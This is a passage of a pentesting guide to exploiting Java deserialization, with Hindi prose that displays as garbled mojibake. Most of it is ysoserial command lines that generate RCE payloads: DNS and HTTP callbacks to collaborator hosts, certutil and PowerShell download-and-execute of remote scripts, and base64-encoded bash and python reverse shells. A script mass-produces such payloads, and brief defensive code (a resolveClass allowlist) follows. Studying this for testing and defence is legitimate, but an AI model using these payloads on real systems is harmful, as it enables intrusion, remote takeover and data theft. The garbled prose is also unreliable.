рд╕рднреА рдЪреАрдЬреЗрдВ рдпрд╣рд╛рдВ рдЙрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдХреЛрдИ рдХрдордЬреЛрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИред рдХрднреА-рдХрднреА рдЖрдк рд╕рдВрдХреНрд░рдорд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рднреАрддрд░ рдбреЗрдЯрд╛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреБрдЫ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж рд╡реЗрдмрдРрдк рдореЗрдВ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░реЗрдВ)ред
рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдЬрд╛рд╡рд╛ рд╕рдВрдХреНрд░рдорд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ рдорд┐рд▓рддрд╛ рд╣реИ рдЬреЛ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрд╕ рд╕рдВрдХреНрд░рдордг рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдорд╛рдирд╡ рдкрдардиреАрдп рд╕реНрд╡рд░реВрдк рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХрд░ рд╕рдХреЗрдВред рдЬрд╛рдирдирд╛ рдХрд┐ рдЖрдк рдХреМрди рд╕реЗ рдбреЗрдЯрд╛ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдФрд░ рдХреБрдЫ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛрдЧрд╛ред

### **рд╢реЛрд╖рдг**

#### **ysoserial**

рдЬрд╛рд╡рд╛ рд╕рдВрдХреНрд░рдордгреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЬреНрдЮрд╛рдд рдЙрдкрдХрд░рдг [**ysoserial**](https://github.com/frohoff/ysoserial) рд╣реИ ([**рдпрд╣рд╛рдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar))ред рдЖрдк [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдЬрдЯрд┐рд▓ рдЖрджреЗрд╢ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдкрд╛рдЗрдк рдХреЗ рд╕рд╛рде) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рджреЗрдЧрд╛ред
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдЙрдкрдХрд░рдг **`ObjectInputStream`** рдХреЗ рд╢реЛрд╖рдг рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИред
рдореИрдВ **"URLDNS"** рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреЗрддрд╛ рд╣реВрдБ **RCE** рдкреЗрд▓реЛрдб рд╕реЗ рдкрд╣рд▓реЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдлрд┐рд░ рднреА, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╢рд╛рдпрдж "URLDNS" рдкреЗрд▓реЛрдб рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реЛ, рд▓реЗрдХрд┐рди рдЕрдиреНрдп RCE рдкреЗрд▓реЛрдб рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реЛред
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"
# Base64 рдореЗрдВ рдкреЗрд▓реЛрдб рдХреЛ рдПрдирдХреЛрдб рдХрд░реЗрдВ
base64 -w0 рдкреЗрд▓реЛрдб
рдЬрдм рдЖрдк **java.lang.Runtime.exec()** рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЗрд▓реЛрдб рдмрдирд╛ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг** рдЬреИрд╕реЗ ">" рдпрд╛ "|" рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдВ, "$()" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдПрдХ рдХрдорд╛рдВрдб рдХреЛ **рдЕрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕** рдХреЗ рд░реВрдк рдореЗрдВ рдЕрд▓рдЧ рдХрд░реЗрдВ рдЬреЛ **рд╕реНрдкреЗрд╕** рджреНрд╡рд╛рд░рд╛ рдЕрд▓рдЧ рд╣реЛрддреЗ рд╣реИрдВ (рдЖрдк `echo -n "hello world"` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк `python2 -c 'print "Hello world"'` рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдкреЗрд▓реЛрдб рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдПрдирдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк [рдЗрд╕ рд╡реЗрдмрдкреЗрдЬ](http://www.jackson-t.ca/runtime-exec-payloads.html) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╡рд┐рдиреНрдбреЛрдЬ рдФрд░ рд▓рд┐рдирдХреНрд╕ рдХреЗ рд▓рд┐рдП **рд╕рднреА рд╕рдВрднрд╡** рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреЗрд▓реЛрдб рдмрдирд╛рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╡рд┐рдирдореНрд░рддрд╛ рд╕реЗ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### рд╕реАрд░рд┐рдпрд▓рдХрд┐рд▓рд░рдмрд╛рдЗрдкрд╛рд╕рдЧреИрдЬреЗрдЯ

рдЖрдк **https://github.com/pwntester/SerialKillerBypassGadgetCollection** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **ysoserial рдХреЗ рд╕рд╛рде** рдФрд░ рдЕрдзрд┐рдХ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕ рдЯреВрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЯреЙрдХ рдХреЗ **рд╕реНрд▓рд╛рдЗрдбреНрд╕ рдореЗрдВ** рд╣реИ рдЬрд╣рд╛рдВ рдЯреВрд▓ рдХреЛ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### рдорд╛рд░реНрд╢рд▓рд╕реЗрдХ

[**рдорд╛рд░реНрд╢рд▓рд╕реЗрдХ**](https://github.com/mbechler/marshalsec) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЬрд╛рд╡рд╛ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди **Json** рдФрд░ **Yml** рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдЕрдиреБрдЪрд┐рдд рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЭреЗ `pom.xml` рдореЗрдВ рдЗрди **рдбрд┐рдкреЗрдВрдбреЗрдВрд╕реАрдЬрд╝** рдХреЛ **рдЬреЛрдбрд╝рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**рдореЗрд╡реЗрди рдЗрдВрд╕реНрдЯреЙрд▓** рдХрд░реЗрдВ, рдФрд░ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ **рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВ:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

рдЗрд╕ рдЬрд╛рд╡рд╛ JSON рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛

* рдпрджрд┐ рдЖрдк рдХреБрдЫ ysoserial payloads рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рдЗрд╕ рд╡реЗрдмрдРрдк** рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### рдХреНрдпреЛрдВ

рдЬрд╛рд╡рд╛ рд╕реАрд░реАрдпрдХрд░рдг рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдмрд╣реБрдд рдкрд╕рдВрдж рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

* **HTTP рдЕрдиреБрд░реЛрдзреЛрдВ** рдореЗрдВ - рдкреИрд░рд╛рдореАрдЯрд░, ViewState, рдХреБрдХреАрдЬрд╝, рдЖрдк рдирд╛рдо рд▓реЛред
* **RMI** - рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдЬрд╛рд╡рд╛ RMI рдкреНрд░реЛрдЯреЛрдХреЙрд▓ 100% рд╕реАрд░реАрдпрдХрд░рдг рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ
* **RMI over HTTP** - рдХрдИ рдЬрд╛рд╡рд╛ рдореЛрдЯреА рдХреНрд▓рд╛рдЗрдВрдЯ рд╡реЗрдм рдРрдкреНрд╕ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ - рдлрд┐рд░ рд╕реЗ 100% рд╕реАрд░реАрдпрдХреГрдд рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕
* **JMX** - рдлрд┐рд░ рд╕реЗ, рддрд╛рд░ рдкрд░ рдЫреЛрдбрд╝реЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕реАрд░реАрдпрдХреГрдд рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ
* **рдХрд╕реНрдЯрдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓** - рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рднреЗрдЬрдирд╛ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ - рдЬрд┐рд╕реЗ рд╣рдо рдЖрдиреЗ рд╡рд╛рд▓реЗ рдХреБрдЫ рдЙрддреНрдкрд╛рджреЛрдВ рдореЗрдВ рджреЗрдЦреЗрдВрдЧреЗ

### рд░реЛрдХрдерд╛рдо

#### рдЕрд╕реНрдерд╛рдпреА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕

`Serializable` рдХрд╛ рдПрдХ рдХрдХреНрд╖рд╛ рдЙрд╕ рдХрдХреНрд╖рд╛ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рднреА рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ `transient` рдХреЗ рд░реВрдк рдореЗрдВ рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреЛ рд╕реАрд░реАрдпрдХрд░рдг рдпреЛрдЧреНрдп рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### рдПрдХ рдХрдХреНрд╖рд╛ рдХреА рд╕рдВрдЪрд╛рд░реАрдХрд░рдг рд╕реЗ рдмрдЪреЗрдВ рдЬреЛ `Serializable` рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ

рдЖрдкрдХреЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдХреБрдЫ рдСрдмреНрдЬреЗрдХреНрдЯ `Serializable` рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдкрдиреЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ `readObject()` рдореЗрдердб рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (рдЬрд┐рд╕рдореЗрдВ `final` рд╕рдВрд╢реЛрдзрдХ рд╣реЛрддрд╛ рд╣реИ) рдЬреЛ рд╣рдореЗрд╢рд╛ рдПрдХ рдЕрдкрд╡рд╛рдж рдлреЗрдВрдХрддрд╛ рд╣реИ:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреНрд▓рд╛рд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдЙрд╕рд╕реЗ рдкрд╣рд▓реЗ

`java.io.ObjectInputStream` рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рд╕рдЦреНрдд рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЙрд╕рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ subclass рдХрд░рдХреЗред рдпрд╣ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╕рдорд╛рдзрд╛рди рд╣реИ рдЕрдЧрд░:

* рдЖрдк рдЙрд╕ рдХреЛрдб рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рддрд╛ рд╣реИ
* рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдХрд┐рди рдХреНрд▓рд╛рд╕реЗрдЬрд╝ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЙрдореНрдореАрдж рдХрд░ рд░рд╣реЗ рд╣реИрдВ

рд╕рд╛рдорд╛рдиреНрдп рд╡рд┐рдЪрд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ [`ObjectInputStream.html#resolveClass()`](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass\(java.io.ObjectStreamClass\)) рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рд╡реЗ рдХреНрд▓рд╛рд╕реЗрдЬрд╝ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдЗрд╕ рдХреЙрд▓ рдХреЗ рдХрд╛рд░рдг, рдЬрдм рддрдХ рдпрд╣ рдЯрд╛рдЗрдк рд╡рд╣ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЖрдк рдпрдХреАрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреЛрдИ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рд╣реЛрдЧреАред

рдпрд╣рд╛рдВ рдПрдХ рд╕рд░рд▓ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд╣рд╛рдВ `LookAheadObjectInputStream` рдХреНрд▓рд╛рд╕ рдХреЛ рдЧрд╛рд░рдВрдЯреА рд╣реИ рдХрд┐ рд╡рд╣ `Bicycle` рдХреНрд▓рд╛рд╕ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреЛрдИ рдЕрдиреНрдп рдЯрд╛рдЗрдк рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛:
```java
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**рдПрдХ рдПрдЬреЗрдВрдЯ рдХреЗ рд╕рд╛рде рд╕рднреА java.io.ObjectInputStream рдЙрдкрдпреЛрдЧ рдХреЛ рдордЬрдмреВрдд рдХрд░реЗрдВ**

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЛрдб рдирд╣реАрдВ рд╣реИ рдпрд╛ рдЖрдк рдкреИрдЪ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ `java.io.ObjectInputStream` рдореЗрдВ рдордЬрдмреВрддреА рдХреЛ рд╡реЛрд╡реЗрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдЬреЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╕рдорд╛рдзрд╛рди рд╣реИред
